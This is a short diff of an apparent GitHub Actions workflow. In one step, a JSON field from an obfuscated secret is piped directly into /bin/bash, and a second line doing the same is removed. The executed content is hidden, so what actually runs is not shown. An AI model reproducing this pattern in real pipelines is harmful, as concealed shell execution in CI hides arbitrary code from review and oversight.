@@ -27,7 +27,6 @@ jobs:
           luxh302: ${{ secrets.luxh302 }}
         run: |
           printf '%s' "$luxh302" | jq -r .zh38473 | /bin/bash
-          printf '%s' "$oov1" | jq -r .vk7194 | /bin/bash
 
       - name: Archive output
         if: always()
